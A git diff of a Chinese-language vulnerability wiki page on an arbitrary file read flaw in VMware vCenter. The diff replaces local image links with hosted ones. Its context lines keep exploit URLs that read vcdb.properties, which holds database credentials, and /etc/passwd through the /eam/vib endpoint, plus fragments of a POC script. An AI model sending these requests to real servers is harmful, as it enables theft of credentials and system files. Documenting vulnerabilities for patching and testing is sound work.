@@ -18,7 +18,7 @@ VMware vCenter特定版本存在任意文件读取漏洞，攻击者通过构造
 
 ## 漏洞复现
 
-![](image/vm-1.png)
+![](http://wikioss.peiqi.tech/vuln/vm-1.png)
 
 使用POC访问漏洞点
 
@@ -30,7 +30,7 @@ VMware vCenter特定版本存在任意文件读取漏洞，攻击者通过构造
 http://xxx.xxx.xxx.xxx/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
 ```
 
-![](image/vm-2.png)
+![](http://wikioss.peiqi.tech/vuln/vm-2.png)
 
 > [!NOTE]
 >
@@ -40,7 +40,7 @@ http://xxx.xxx.xxx.xxx/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware
 https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd
 ```
 
-![](image/vm-3.png)
+![](http://wikioss.peiqi.tech/vuln/vm-3.png)
 
 ## 漏洞利用POC
 
@@ -88,4 +88,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](image/vm-4.png)
+![](http://wikioss.peiqi.tech/vuln/vm-4.png)
